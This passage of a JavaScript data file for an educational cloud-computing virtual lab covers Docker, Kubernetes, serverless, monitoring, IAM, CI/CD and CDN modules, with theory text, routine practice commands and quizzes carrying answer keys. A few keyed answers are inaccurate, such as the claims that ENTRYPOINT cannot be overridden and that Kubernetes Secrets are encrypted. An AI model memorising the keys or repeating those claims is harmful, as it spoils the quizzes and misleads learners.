                "content": "Containers are ephemeral — data is lost on container removal unless persisted.\nVolume types:\n• Named volumes: Managed by Docker (docker volume create)\n• Bind mounts: Mount host directory into container (-v /host/path:/container/path)\n• tmpfs: In-memory, never persisted\n\ndocker run -v my-vol:/data nginx  # Mount named volume\nDocker volumes survive container deletion and can be shared between containers."
            }
        ]
    },
    "pretest": [
        {
            "q": "A Docker image is:",
            "options": [
                "A running container instance",
                "A read-only layered filesystem blueprint",
                "A virtual machine snapshot",
                "A Docker network"
            ],
            "correct": 1
        },
        {
            "q": "Which Dockerfile instruction sets the base image?",
            "options": [
                "RUN",
                "COPY",
                "FROM",
                "CMD"
            ],
            "correct": 2
        },
        {
            "q": "docker run -p 8080:80 maps:",
            "options": [
                "Container port 8080 to host port 80",
                "Host port 8080 to container port 80",
                "Both ports to 80",
                "Network 8080 to container 80"
            ],
            "correct": 1
        },
        {
            "q": "Container data is lost by default when:",
            "options": [
                "The image is pulled again",
                "The container is stopped",
                "The container is removed (deleted)",
                "The host reboots"
            ],
            "correct": 2
        },
        {
            "q": "Docker Hub is a:",
            "options": [
                "Container runtime",
                "Container orchestration platform",
                "Public registry for Docker images",
                "Hypervisor"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Write a Dockerfile for a simple Python Flask app in the editor.",
        "2. Click 'Build Image' — watch layers being built step by step.",
        "3. Run the container with port mapping and observe it start.",
        "4. Execute commands inside the running container (docker exec).",
        "5. Stop and remove the container, then observe data loss without volumes."
    ],
    "posttest": [
        {
            "q": "Docker layer caching means:",
            "options": [
                "Docker stores images in RAM",
                "Unchanged Dockerfile layers are reused from cache during rebuilds",
                "All layers are rebuilt every time",
                "Cache is shared across all images"
            ],
            "correct": 1
        },
        {
            "q": "The difference between CMD and ENTRYPOINT in Dockerfile:",
            "options": [
                "They are identical",
                "ENTRYPOINT cannot be overridden at runtime; CMD provides defaults that can be overridden",
                "CMD is required, ENTRYPOINT is optional",
                "ENTRYPOINT runs before FROM"
            ],
            "correct": 1
        },
        {
            "q": "Multi-stage Docker builds are used to:",
            "options": [
                "Run multiple containers simultaneously",
                "Reduce final image size by separating build and runtime stages",
                "Enable container networking",
                "Create Docker volumes automatically"
            ],
            "correct": 1
        },
        {
            "q": "docker-compose is used for:",
            "options": [
                "Building Docker images",
                "Defining and running multi-container applications",
                "Managing Docker registries",
                "Container security scanning"
            ],
            "correct": 1
        },
        {
            "q": "A Docker overlay network enables:",
            "options": [
                "Single-host container communication",
                "Cross-host container communication in Docker Swarm/Kubernetes",
                "Internet access for containers",
                "External volume mounting"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_docker",
    "practice_commands": [
        "docker build -t myapp:1.0 .",
        "docker run -d -p 8080:80 --name webapp myapp:1.0",
        "docker exec -it webapp bash",
        "docker-compose up -d"
    ],
    "practice_questions": [
        "Write a Dockerfile for a Node.js application optimized for production (minimal size, non-root user).",
        "Explain how Docker layer caching can be exploited for faster CI/CD pipelines."
    ]
};

window.VLAB_DATA.cloud_kubernetes = {
    "title": "Kubernetes Orchestration",
    "aim": "To understand Kubernetes architecture, simulate deploying a containerized application with Deployments, Services, and ConfigMaps, and observe pod scheduling and self-healing.",
    "theory": {
        "intro": "Kubernetes (K8s) is the de-facto standard for container orchestration. It automates deployment, scaling, networking, and self-healing of containerized applications across a cluster of nodes. Cloud providers offer managed Kubernetes: Amazon EKS, Google GKE, Azure AKS.",
        "cards": [
            {
                "title": "1. Kubernetes Architecture",
                "content": "Control Plane (Master) components:\n• API Server: Central hub for all K8s operations (kubectl → API Server)\n• etcd: Distributed key-value store (cluster state)\n• Scheduler: Assigns pods to nodes based on resources and constraints\n• Controller Manager: Runs controllers (Deployment, ReplicaSet, etc.)\n\nWorker Node components:\n• kubelet: Node agent, ensures pods are running\n• kube-proxy: Network rules for pod communication\n• Container Runtime: Docker/containerd runs actual containers"
            },
            {
                "title": "2. Core K8s Objects",
                "content": "Pod: Smallest deployable unit, one or more containers sharing network/storage\nReplicaSet: Ensures N pod replicas are always running\nDeployment: Manages ReplicaSets, enables rolling updates and rollbacks\nService: Stable network endpoint for pods (ClusterIP, NodePort, LoadBalancer)\nConfigMap: Externalize configuration (non-sensitive)\nSecret: Encrypted sensitive data (passwords, API keys)\nNamespace: Virtual cluster isolation within a physical cluster"
            },
            {
                "title": "3. Pod Scheduling & Self-Healing",
                "content": "Scheduler selects nodes using:\n• Filtering: Remove nodes that don't meet resource requests\n• Scoring: Rank remaining nodes by available resources, affinity rules\n\nSelf-healing:\n• If pod crashes → ReplicaSet creates a replacement pod automatically\n• If node fails → Pods rescheduled to healthy nodes\n• Liveness probe: Restart container if it becomes unhealthy\n• Readiness probe: Stop sending traffic if pod is not ready"
            }
        ]
    },
    "pretest": [
        {
            "q": "Which K8s component schedules pods to worker nodes?",
            "options": [
                "kubelet",
                "API Server",
                "Scheduler",
                "etcd"
            ],
            "correct": 2
        },
        {
            "q": "A Kubernetes Service with type 'LoadBalancer':",
            "options": [
                "Routes traffic within the cluster only",
                "Exposes the service externally via a cloud load balancer",
                "Provides DNS for pods",
                "Manages pod replicas"
            ],
            "correct": 1
        },
        {
            "q": "etcd in Kubernetes stores:",
            "options": [
                "Container images",
                "The complete cluster state and configuration",
                "Application logs",
                "Pod resource metrics"
            ],
            "correct": 1
        },
        {
            "q": "A Pod with 2 containers shares:",
            "options": [
                "Nothing — fully isolated",
                "Network namespace and volumes only",
                "CPU and RAM allocation",
                "Container filesystem"
            ],
            "correct": 1
        },
        {
            "q": "Rolling update in a Deployment:",
            "options": [
                "Deletes all old pods then creates new ones",
                "Replaces pods incrementally (zero-downtime)",
                "Updates container images in place",
                "Requires manual pod deletion"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the K8s cluster with 3 worker nodes.",
        "2. Apply a Deployment YAML with 3 replicas — watch pods scheduled across nodes.",
        "3. Create a ClusterIP Service to expose the pods internally.",
        "4. Delete one pod and watch K8s automatically reschedule a replacement.",
        "5. Trigger a rolling update by changing the image version."
    ],
    "posttest": [
        {
            "q": "kubectl get pods -o wide shows:",
            "options": [
                "Pod logs",
                "Pod details including node assignment",
                "Pod resource limits",
                "Pod network policies"
            ],
            "correct": 1
        },
        {
            "q": "A Kubernetes ConfigMap stores:",
            "options": [
                "Encrypted secrets only",
                "Non-sensitive configuration data as key-value pairs",
                "Container images",
                "Network policies"
            ],
            "correct": 1
        },
        {
            "q": "Pod Disruption Budget (PDB) ensures:",
            "options": [
                "Pods always run on the same node",
                "A minimum number of pods remain available during voluntary disruptions",
                "Pods get maximum CPU",
                "All pods are in the same namespace"
            ],
            "correct": 1
        },
        {
            "q": "Kubernetes Ingress provides:",
            "options": [
                "Pod-to-pod communication",
                "Layer 7 HTTP/HTTPS routing to services from external clients",
                "Node-level network policy",
                "Storage class configuration"
            ],
            "correct": 1
        },
        {
            "q": "The purpose of Kubernetes Namespaces is:",
            "options": [
                "Physical node separation",
                "Logical isolation of resources within a cluster",
                "Network encryption",
                "Image registry management"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_kubernetes",
    "practice_commands": [
        "kubectl apply -f deployment.yaml",
        "kubectl get pods -n prod",
        "kubectl scale deployment webapp --replicas=5",
        "kubectl rollout undo deployment/webapp"
    ],
    "practice_questions": [
        "Design a K8s architecture for a 3-tier web application with frontend, backend, and database.",
        "Explain how Kubernetes handles a node failure in a production cluster."
    ]
};

window.VLAB_DATA.cloud_serverless = {
    "title": "Serverless Computing (FaaS)",
    "aim": "To understand serverless architecture, simulate AWS Lambda function execution lifecycle, event triggers, and cold/warm start behavior, comparing costs with traditional server-based approaches.",
    "theory": {
        "intro": "Serverless computing abstracts server management entirely from developers. With Function as a Service (FaaS), developers deploy individual functions that are triggered by events and automatically scale from zero to millions of invocations. Billing is per-invocation and execution time — no idle cost.",
        "cards": [
            {
                "title": "1. FaaS Execution Model",
                "content": "Function lifecycle:\n1. Trigger event received (HTTP, S3 event, SQS message, timer)\n2. Runtime container initialized (cold start) or reused (warm start)\n3. Function code executed\n4. Response returned\n5. Container kept warm for subsequent invocations (warm reuse)\n\nCold start: Container initialization adds 100ms–10s latency\nWarm start: Reuse existing container, near-zero overhead"
            },
            {
                "title": "2. AWS Lambda Model",
                "content": "• Memory: 128MB – 10,240MB (CPU scales proportionally)\n• Timeout: Up to 15 minutes\n• Concurrency: Up to 1,000 concurrent executions per region (default)\n• Pricing: $0.0000002 per request + $0.0000166667 per GB-second\n• Triggers: API Gateway, S3, DynamoDB Streams, SQS, SNS, EventBridge, CloudWatch Events\n• Layers: Shared code/libraries packaged separately"
            },
            {
                "title": "3. Serverless Architecture Patterns",
                "content": "Event-Driven Processing:\nS3 upload → Lambda → DynamoDB insert → SNS notification\n\nAPI Backend:\nAPI Gateway → Lambda → DynamoDB (pay per request, no EC2)\n\nScheduled Tasks:\nCloudWatch Events (cron) → Lambda (replace cron jobs)\n\nStream Processing:\nKinesis Data Stream → Lambda → S3 (real-time ETL)"
            }
        ]
    },
    "pretest": [
        {
            "q": "In serverless FaaS, you pay for:",
            "options": [
                "Reserved VM capacity",
                "Per invocation count and execution duration",
                "Fixed monthly subscription",
                "Number of containers deployed"
            ],
            "correct": 1
        },
        {
            "q": "A Lambda 'cold start' refers to:",
            "options": [
                "Lambda running in a cold data center",
                "Initial container initialization delay before function execution",
                "Function timeout error",
                "Lambda version rollback"
            ],
            "correct": 1
        },
        {
            "q": "AWS Lambda maximum timeout is:",
            "options": [
                "1 minute",
                "5 minutes",
                "15 minutes",
                "60 minutes"
            ],
            "correct": 2
        },
        {
            "q": "Which AWS service acts as HTTP trigger for Lambda functions?",
            "options": [
                "SQS",
                "SNS",
                "API Gateway",
                "CloudWatch"
            ],
            "correct": 2
        },
        {
            "q": "Serverless is most cost-effective for workloads that are:",
            "options": [
                "Continuously running 24/7",
                "Sporadic or event-driven with variable traffic",
                "High-performance computing (HPC)",
                "Stateful database operations"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Write a simple JavaScript Lambda function in the code editor.",
        "2. Configure an API Gateway trigger with a POST route.",
        "3. Click 'Invoke' — observe cold start initialization time (highlighted).",
        "4. Invoke again immediately — observe warm start (much faster).",
        "5. Simulate 100 concurrent invocations and watch automatic horizontal scaling."
    ],
    "posttest": [
        {
            "q": "Provisioned Concurrency in Lambda:",
            "options": [
                "Limits Lambda concurrency",
                "Pre-initializes containers to eliminate cold starts",
                "Allocates dedicated EC2 instances",
                "Increases Lambda timeout"
            ],
            "correct": 1
        },
        {
            "q": "Lambda Layers are used to:",
            "options": [
                "Add network layers",
                "Share common code and libraries across multiple functions",
                "Increase function memory",
                "Enable VPC access"
            ],
            "correct": 1
        },
        {
            "q": "The maximum deployment package size for a Lambda function (direct upload) is:",
            "options": [
                "10 MB",
                "50 MB",
                "250 MB (from S3)",
                "1 GB"
            ],
            "correct": 1
        },
        {
            "q": "Lambda @ Edge runs functions:",
            "options": [
                "In a central AWS region only",
                "At CloudFront edge locations closest to users",
                "Inside VPC only",
                "On dedicated servers"
            ],
            "correct": 1
        },
        {
            "q": "Dead Letter Queue (DLQ) in Lambda is used for:",
            "options": [
                "Storing Lambda logs",
                "Capturing failed asynchronous invocations for retry or analysis",
                "Reducing cold start",
                "Caching function responses"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_serverless",
    "practice_commands": [
        "aws lambda invoke --function-name myFunc output.json",
        "aws lambda create-function --function-name myFunc --runtime nodejs18.x",
        "sam local invoke MyFunction -e event.json"
    ],
    "practice_questions": [
        "Compare the monthly cost of a Lambda function vs EC2 t3.micro for 1M invocations at 200ms each.",
        "Design a serverless image processing pipeline triggered by S3 uploads."
    ]
};

window.VLAB_DATA.cloud_monitoring = {
    "title": "Cloud Monitoring & Observability",
    "aim": "To set up and simulate cloud monitoring using metrics, logs, and traces, understand the three pillars of observability, and configure alerts for anomaly detection.",
    "theory": {
        "intro": "Observability is the ability to understand the internal state of a system by examining its outputs. In cloud environments with distributed microservices, traditional monitoring is insufficient — full observability requires three pillars: Metrics, Logs, and Traces. Together they enable root-cause analysis and proactive issue detection.",
        "cards": [
            {
                "title": "1. Metrics (What is happening)",
                "content": "Numeric measurements of system state over time.\n• AWS CloudWatch: EC2 CPU, Lambda duration, RDS connections\n• Prometheus: Open-source time-series metrics collection\n• Datadog, New Relic: Commercial observability platforms\n\nKey metrics categories:\n• Infrastructure: CPU, RAM, disk, network I/O\n• Application: Request rate, error rate, latency (p50/p95/p99)\n• Business: Orders per minute, revenue, active users"
            },
            {
                "title": "2. Logs (What happened)",
                "content": "Timestamped text records of discrete events.\n• AWS CloudWatch Logs: Centralized log collection\n• ELK Stack: Elasticsearch + Logstash + Kibana\n• Log levels: DEBUG, INFO, WARN, ERROR, FATAL\n\nStructured logging (JSON format):\n{level: 'error', timestamp: '...', requestId: '...', message: 'DB timeout'}\nEnables efficient filtering, search, and aggregation in log analytics tools."
            },
            {
                "title": "3. Traces (Why it happened)",
                "content": "Distributed traces track a request across multiple services.\n• AWS X-Ray: Distributed tracing for AWS services\n• Jaeger, Zipkin: Open-source distributed tracing\n• OpenTelemetry: Vendor-neutral observability framework\n\nTrace concepts:\n• Span: Single operation within a service (with start time, duration, tags)\n• Trace ID: Unique identifier propagated across all service hops\n• Service Map: Visual graph of service dependencies and latency"
            }
        ]
    },
    "pretest": [
        {
            "q": "Which observability pillar tracks a request across multiple services?",
            "options": [
                "Metrics",
                "Logs",
                "Traces",
                "Alerts"
            ],
            "correct": 2
        },
        {
            "q": "Prometheus is primarily used for:",
            "options": [
                "Log aggregation",
                "Time-series metrics collection and alerting",
                "Distributed tracing",
                "Secret management"
            ],
            "correct": 1
        },
        {
            "q": "A p99 latency metric means:",
            "options": [
                "Average request latency",
                "99% of requests complete within this time",
                "99 requests per second",
                "Top 1% of CPU usage"
            ],
            "correct": 1
        },
        {
            "q": "AWS CloudWatch alarms trigger when:",
            "options": [
                "An EC2 instance starts",
                "A metric crosses a defined threshold for a specified period",
                "A log entry is created",
                "An S3 file is uploaded"
            ],
            "correct": 1
        },
        {
            "q": "Structured logging uses which format for machine-readable logs?",
            "options": [
                "Plain text",
                "CSV files",
                "JSON format",
                "Binary encoding"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. View live metric graphs (CPU, memory, request rate) for a simulated web service.",
        "2. Configure a CloudWatch alarm: CPU > 80% for 5 minutes → trigger SNS notification.",
        "3. Inject a fault (high CPU) and watch the alarm state change to ALARM.",
        "4. Explore the distributed trace for a sample slow request across 3 microservices.",
        "5. Search logs for ERROR-level entries during the fault period."
    ],
    "posttest": [
        {
            "q": "The USE method for performance analysis stands for:",
            "options": [
                "Utilization, Saturation, Errors",
                "Usage, Speed, Efficiency",
                "Utilization, Size, Execution",
                "Uptime, Speed, Errors"
            ],
            "correct": 0
        },
        {
            "q": "AWS X-Ray sampling is used to:",
            "options": [
                "Encrypt trace data",
                "Trace only a percentage of requests to reduce overhead",
                "Limit API calls",
                "Filter log entries"
            ],
            "correct": 1
        },
        {
            "q": "An SLO (Service Level Objective) defines:",
            "options": [
                "System architecture goals",
                "A specific measurable target for service reliability (e.g., 99.9% uptime)",
                "Security compliance goals",
                "Cost optimization targets"
            ],
            "correct": 1
        },
        {
            "q": "Error budget in SRE is:",
            "options": [
                "Financial budget for error handling",
                "Allowed amount of downtime within an SLO period (1 - availability target)",
                "Number of bug fixes allowed per sprint",
                "Memory allocated for error logs"
            ],
            "correct": 1
        },
        {
            "q": "OpenTelemetry provides:",
            "options": [
                "A specific monitoring product",
                "Vendor-neutral APIs and SDKs for collecting metrics, logs, and traces",
                "Container orchestration",
                "Cloud cost management"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_monitoring",
    "practice_commands": [
        "aws cloudwatch get-metric-statistics --metric-name CPUUtilization",
        "kubectl top pods -n prod",
        "aws logs filter-log-events --log-group-name /app/prod --filter-pattern ERROR"
    ],
    "practice_questions": [
        "Design an alerting strategy for a 3-tier application with SLO of 99.9% availability.",
        "Explain how distributed tracing helps diagnose a latency spike in a microservices architecture."
    ]
};

window.VLAB_DATA.cloud_security = {
    "title": "Cloud Security & IAM",
    "aim": "To implement cloud security best practices using Identity and Access Management (IAM), simulate the principle of least privilege, and explore cloud security misconfigurations.",
    "theory": {
        "intro": "Cloud security operates on a shared responsibility model — the provider secures the infrastructure, while the customer secures data, identities, and configurations. IAM (Identity and Access Management) is the first line of defense, controlling who can access what resources under which conditions.",
        "cards": [
            {
                "title": "1. AWS IAM Fundamentals",
                "content": "IAM Entities:\n• Users: Individual accounts with credentials (username/password, access keys)\n• Groups: Collection of users sharing the same permissions\n• Roles: Temporary permissions assumed by services or users (no credentials)\n• Policies: JSON documents defining Allow/Deny permissions\n\nPrinciple of Least Privilege: Grant only the minimum permissions required.\nIAM evaluation: Explicit Deny > Explicit Allow > Implicit Deny (default)"
            },
            {
                "title": "2. IAM Policy Structure",
                "content": "{\n  'Version': '2012-10-17',\n  'Statement': [{\n    'Effect': 'Allow',\n    'Action': ['s3:GetObject', 's3:PutObject'],\n    'Resource': 'arn:aws:s3:::my-bucket/*',\n    'Condition': {\n      'IpAddress': {'aws:SourceIp': '10.0.0.0/8'}\n    }\n  }]\n}\nCondition keys enable context-aware access control (IP, MFA, time, tags)."
            },
            {
                "title": "3. Common Cloud Security Misconfigurations",
                "content": "Top cloud security risks (CSA Top Threats):\n• Publicly exposed S3 buckets (data breaches: Capital One 2019)\n• Overly permissive IAM policies (star permissions: 'Action': '*')\n• No MFA on root/admin accounts\n• Unencrypted data at rest and in transit\n• Security groups open to 0.0.0.0/0 on sensitive ports\n• No CloudTrail logging (no audit trail)\n• Hardcoded credentials in source code"
            }
        ]
    },
    "pretest": [
        {
            "q": "AWS IAM Roles differ from IAM Users because:",
            "options": [
                "Roles have permanent credentials",
                "Roles provide temporary credentials assumed by services/users, no permanent keys",
                "Roles can only be used by humans",
                "Roles are not supported in IAM policies"
            ],
            "correct": 1
        },
        {
            "q": "The principle of least privilege means:",
            "options": [
                "Give all users admin access",
                "Grant only the minimum permissions needed for a task",
                "Deny all permissions by default and never grant any",
                "Share credentials among team members"
            ],
            "correct": 1
        },
        {
            "q": "An explicit Deny in IAM policy:",
            "options": [
                "Is overridden by an explicit Allow",
                "Takes precedence over any Allow",
                "Is the same as implicit Deny",
                "Applies only to S3 resources"
            ],
            "correct": 1
        },
        {
            "q": "AWS CloudTrail records:",
            "options": [
                "Network packet data",
                "API calls made to AWS services (who did what, when)",
                "Application logs",
                "Container metrics"
            ],
            "correct": 1
        },
        {
            "q": "A security group in AWS acts as:",
            "options": [
                "A firewall at the subnet level",
                "A stateful firewall at the instance level",
                "An IAM policy for EC2",
                "A VPC routing rule"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Create an IAM user and assign policies via the policy simulator.",
        "2. Test access: try to access an S3 bucket without the correct policy (should fail).",
        "3. Add an S3 read-only policy and verify access is now granted.",
        "4. Simulate an overly permissive policy (Action: *) and identify the security risk.",
        "5. Enable MFA simulation and observe the Condition key enforcement."
    ],
    "posttest": [
        {
            "q": "AWS Config is used to:",
            "options": [
                "Monitor EC2 performance",
                "Track resource configuration changes and evaluate compliance rules",
                "Manage IAM users",
                "Distribute content globally"
            ],
            "correct": 1
        },
        {
            "q": "AWS KMS (Key Management Service) is used for:",
            "options": [
                "Network encryption only",
                "Creating, managing, and auditing cryptographic keys for data encryption",
                "Managing IAM access keys",
                "SSL certificate issuance"
            ],
            "correct": 1
        },
        {
            "q": "VPC Security Groups are stateful, meaning:",
            "options": [
                "All traffic is blocked by default",
                "Return traffic for allowed connections is automatically permitted",
                "Rules apply to both ingress and egress explicitly",
                "State is synchronized across regions"
            ],
            "correct": 1
        },
        {
            "q": "Service Control Policies (SCPs) in AWS Organizations:",
            "options": [
                "Replace IAM policies for individual accounts",
                "Set guardrails that limit permissions across all accounts in an OU",
                "Grant permissions to IAM roles",
                "Configure EC2 security groups centrally"
            ],
            "correct": 1
        },
        {
            "q": "The AWS Shared Responsibility Model states that AWS is responsible for:",
            "options": [
                "Customer data encryption",
                "OS patching on EC2 (customer-managed)",
                "Security OF the cloud (hardware, hypervisor, physical facilities)",
                "Application-level security"
            ],
            "correct": 2
        }
    ],
    "simType": "cloud_security",
    "practice_commands": [
        "aws iam simulate-principal-policy --policy-source-arn arn:...",
        "aws iam get-account-authorization-details",
        "aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=admin"
    ],
    "practice_questions": [
        "Write an IAM policy granting read-only access to a specific S3 bucket from a specific IP range.",
        "Identify 5 security misconfigurations in a given AWS CloudFormation template."
    ]
};

window.VLAB_DATA.cloud_devops = {
    "title": "CI/CD Pipeline & DevOps on Cloud",
    "aim": "To design and simulate a complete CI/CD pipeline using cloud-native services, demonstrating automated build, test, and deployment stages for a containerized application.",
    "theory": {
        "intro": "DevOps combines development (Dev) and operations (Ops) practices to shorten the software delivery lifecycle while maintaining high quality. CI/CD (Continuous Integration / Continuous Deployment) is the automation backbone of DevOps, enabling teams to deliver code changes frequently and reliably.",
        "cards": [
            {
                "title": "1. CI — Continuous Integration",
                "content": "Developers frequently merge code changes into a shared repository. Each merge triggers:\n1. Code checkout\n2. Static analysis (linting, SAST)\n3. Unit & integration tests\n4. Build artifact creation (Docker image, JAR, ZIP)\n5. Artifact pushed to registry\n\nTools: AWS CodeBuild, GitHub Actions, Jenkins, GitLab CI, CircleCI\nGoal: Detect integration bugs early, keep main branch always deployable"
            },
            {
                "title": "2. CD — Continuous Deployment/Delivery",
                "content": "Continuous Delivery: Code is automatically tested and prepared for release (human approval gate for production)\nContinuous Deployment: Every passing commit is automatically deployed to production\n\nDeployment strategies:\n• Blue/Green: Two identical environments, traffic switched at once (zero downtime, instant rollback)\n• Canary: Gradually route traffic to new version (5% → 20% → 100%)\n• Rolling: Replace old instances with new ones incrementally\n• Recreate: Stop all old, start all new (downtime)"
            },
            {
                "title": "3. AWS DevOps Services",
                "content": "• CodeCommit: Git repository (like GitHub on AWS)\n• CodeBuild: Managed build service (runs buildspec.yml)\n• CodeDeploy: Automated deployment to EC2, ECS, Lambda\n• CodePipeline: Orchestrates the full CI/CD pipeline\n• ECR: Elastic Container Registry (Docker image storage)\n• ECS/EKS: Container deployment targets\n\nPipeline: CodeCommit → CodeBuild → ECR → CodeDeploy → ECS"
            }
        ]
    },
    "pretest": [
        {
            "q": "Continuous Integration (CI) primarily aims to:",
            "options": [
                "Deploy code to production automatically",
                "Frequently merge and test code changes to detect bugs early",
                "Monitor production performance",
                "Manage cloud infrastructure"
            ],
            "correct": 1
        },
        {
            "q": "Blue/Green deployment uses:",
            "options": [
                "One environment with rolling updates",
                "Two identical environments for zero-downtime deployment",
                "Container blue and green namespaces",
                "Manual deployment with color coding"
            ],
            "correct": 1
        },
        {
            "q": "A Canary deployment routes:",
            "options": [
                "All traffic to new version immediately",
                "A small percentage of traffic to the new version first",
                "Traffic only during testing",
                "Traffic based on geographic region"
            ],
            "correct": 1
        },
        {
            "q": "AWS CodePipeline orchestrates:",
            "options": [
                "Database migrations only",
                "The full CI/CD workflow across multiple stages",
                "Container networking only",
                "IAM policy changes"
            ],
            "correct": 1
        },
        {
            "q": "Infrastructure as Code (IaC) with CloudFormation stores:",
            "options": [
                "Application code",
                "Infrastructure configuration as version-controlled templates",
                "Database schemas",
                "IAM credentials"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the pipeline: Source (Git push) → Build → Test → Deploy stages.",
        "2. Commit a code change — watch the pipeline automatically trigger.",
        "3. Observe the build stage: Docker image built and pushed to registry.",
        "4. Watch the test stage run unit tests — fail one test to see pipeline halt.",
        "5. Fix the test and redeploy using Blue/Green strategy — observe traffic switching."
    ],
    "posttest": [
        {
            "q": "A buildspec.yml file in AWS CodeBuild defines:",
            "options": [
                "IAM permissions for builds",
                "Build commands, phases, and artifacts specification",
                "Docker Compose configuration",
                "CloudFormation resources"
            ],
            "correct": 1
        },
        {
            "q": "Shift-left testing in DevOps means:",
            "options": [
                "Moving tests to the right side of the pipeline",
                "Performing testing earlier in the development lifecycle",
                "Shifting test environments to the left data center",
                "Left-to-right deployment strategy"
            ],
            "correct": 1
        },
        {
            "q": "GitOps uses Git as:",
            "options": [
                "A deployment platform",
                "The single source of truth for infrastructure and application state",
                "A container registry",
                "A monitoring tool"
            ],
            "correct": 1
        },
        {
            "q": "Rollback in a CD pipeline is fastest with:",
            "options": [
                "Recreate deployment strategy",
                "Rolling deployment",
                "Blue/Green deployment (just switch traffic back)",
                "Manual SSH deployment"
            ],
            "correct": 2
        },
        {
            "q": "DORA metrics measure DevOps performance using:",
            "options": [
                "Cost per deployment",
                "Deployment frequency, lead time, MTTR, change failure rate",
                "Number of developers",
                "Cloud provider SLA"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_devops",
    "practice_commands": [
        "aws codepipeline start-pipeline-execution --name MyPipeline",
        "docker build -t app:$(git rev-parse --short HEAD) .",
        "kubectl set image deployment/webapp webapp=myapp:v2 --record"
    ],
    "practice_questions": [
        "Design a complete CI/CD pipeline for a microservices application with 5 services using AWS DevOps tools.",
        "Compare Blue/Green and Canary deployment strategies for a payment processing service."
    ]
};

window.VLAB_DATA.cloud_cdn = {
    "title": "Content Delivery Network (CDN)",
    "aim": "To understand how CDNs cache and serve content from geographically distributed edge servers, reducing latency and offloading origin servers.",
    "theory": {
        "intro": "A CDN is a distributed network of servers (Points of Presence / PoPs) strategically placed around the world. When a user requests content, the CDN routes them to the nearest edge server, dramatically reducing round-trip latency. CDNs cache static assets at edge nodes so origin servers only serve cache-miss requests.",
        "cards": [
            {
                "title": "1. How CDN Works",
                "content": "1. User requests asset (e.g., image.jpg).\n2. DNS resolves to the nearest CDN edge PoP via Anycast routing.\n3. Edge checks its cache — Cache HIT: serve immediately from edge.\n4. Cache MISS: edge fetches from origin, caches it (with TTL), then serves.\n5. Subsequent users at same PoP get cache HIT.\n\nKey metrics: Cache Hit Ratio, Origin Offload %, TTFB (Time to First Byte)"
            },
            {
                "title": "2. Cache Control & TTL",
                "content": "TTL (Time to Live) controls how long content stays in edge cache.\n• Cache-Control: max-age=86400 → cache for 24 hours\n• Cache-Control: no-cache → always revalidate with origin\n• ETag / Last-Modified: Conditional GETs — only pull fresh if changed\n• Versioned URLs (app.js?v=2): Force cache bust on deploy\n• Vary header: Cache different versions by Accept-Encoding, User-Agent"
            },
            {
                "title": "3. CDN Features",
                "content": "• SSL/TLS Termination at edge (reduces origin TLS overhead)\n• DDoS protection — absorbs attack at edge before reaching origin\n• Web Application Firewall (WAF) at edge\n• Image optimization — WebP conversion, resize on-the-fly\n• Video streaming — HLS/DASH adaptive bitrate from edge\n• Geo-restriction — block content by country at edge\n• Edge computing (Cloudflare Workers, Lambda@Edge) — run code at PoP"
            },
            {
                "title": "4. Major CDN Providers",
                "content": "• AWS CloudFront: Integrates with S3, EC2, ALB; 450+ PoPs\n• Cloudflare: 300+ cities, includes DDoS, WAF, Workers\n• Akamai: Oldest CDN, 4000+ PoPs, enterprise-focused\n• Azure CDN: Integrates with Azure Blob, Static Web Apps\n• Fastly: Real-time purge (150ms), VCL configuration language\n• Google Cloud CDN: Anycast, integrates with Cloud Load Balancing"
            }
        ]
    },
    "pretest": [
        {
            "q": "A CDN Cache HIT means:",
            "options": [
                "Content fetched from origin",
                "Content served from edge server cache",
                "Content blocked by firewall",
                "Content deleted from edge"
            ],
            "correct": 1
        },
        {
            "q": "Anycast routing in CDN directs users to:",
            "options": [
                "A random server",
                "The nearest edge PoP based on network topology",
                "The origin server always",
                "The cheapest server"
            ],
            "correct": 1
        },
        {
            "q": "TTL in CDN cache headers controls:",
            "options": [
                "Transfer speed",
                "How long content stays cached at edge",
                "Number of simultaneous connections",
                "SSL certificate validity"
            ],
            "correct": 1
        },
        {
            "q": "Cache busting with versioned URLs works by:",
            "options": [
                "Deleting edge caches manually",
                "Changing the URL so the CDN treats it as new content",
                "Disabling caching globally",
                "Using HTTP DELETE"
            ],
            "correct": 1
        },
        {
            "q": "CDN reduces origin server load by:",
            "options": [
                "Blocking all requests",
                "Serving cached content from edge, reducing cache-miss requests to origin",
                "Compressing requests",
                "Routing all traffic through VPN"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the world map showing CDN edge PoPs and a simulated origin server.",
        "2. Click a user location to generate a request — observe routing to nearest PoP.",
        "3. First request causes cache MISS — watch origin fetch and edge caching.",
        "4. Repeat request from same region — observe instant cache HIT.",
        "5. Adjust TTL and observe cache expiry, then simulate a cache purge."
    ],
    "posttest": [
        {
            "q": "Origin offload percentage measures:",
            "options": [
                "Server CPU usage",
                "Percentage of requests served from cache (not reaching origin)",
                "Network bandwidth used",
                "Number of PoPs active"
            ],
            "correct": 1
        },
        {
            "q": "Lambda@Edge / Cloudflare Workers enable:",
            "options": [
                "Running serverless code at CDN edge PoPs",
                "Managing origin server databases",
                "Provisioning new CDN nodes",
                "Configuring DNS records"
            ],
            "correct": 0
        },
        {
            "q": "Stale-While-Revalidate directive means:",
            "options": [
                "Always serve fresh content",
                "Serve stale cached content while fetching fresh in background",
                "Block requests while cache updates",
                "Invalidate all caches immediately"
            ],
            "correct": 1
        },
        {
            "q": "A CDN Cache MISS for private/personalized pages can be avoided by:",
            "options": [
                "Setting TTL=0 or no-store for dynamic/private content",
                "Adding more PoPs",
                "Increasing bandwidth",
                "Using HTTP/2"
            ],
            "correct": 0
        },
        {
            "q": "TTFB improvement from CDN comes from:",
            "options": [
                "Faster origin servers",
                "Reduced physical network distance to edge PoP",
                "Larger server RAM",
                "TCP keep-alive"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_cdn",
    "practice_commands": [
